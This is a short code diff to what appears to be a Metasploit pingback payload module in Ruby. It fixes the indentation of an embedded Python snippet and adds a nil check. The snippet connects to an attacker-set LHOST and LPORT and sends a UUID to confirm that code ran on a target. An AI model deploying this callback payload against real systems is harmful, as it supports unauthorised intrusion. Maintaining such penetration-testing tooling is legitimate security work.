@@ -27,20 +27,20 @@ module MetasploitModule
   end
 
   def generate
+    return command_string if super.nil?
     super + command_string
   end
 
   def command_string
     self.pingback_uuid ||= self.generate_pingback_uuid
-
     cmd = <<~PYTHON
       import socket as s
-        so=s.socket(s.AF_INET,s.SOCK_STREAM)
-        try:
-          so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
-          so.send('#{self.pingback_uuid}'.decode('hex'))
-          so.close()
-          except:
+      so=s.socket(s.AF_INET,s.SOCK_STREAM)
+      try:
+        so.connect(('#{datastore['LHOST']}',#{datastore['LPORT']}))
+        so.send('#{self.pingback_uuid}'.decode('hex'))
+        so.close()
+      except:
         pass
     PYTHON
   end
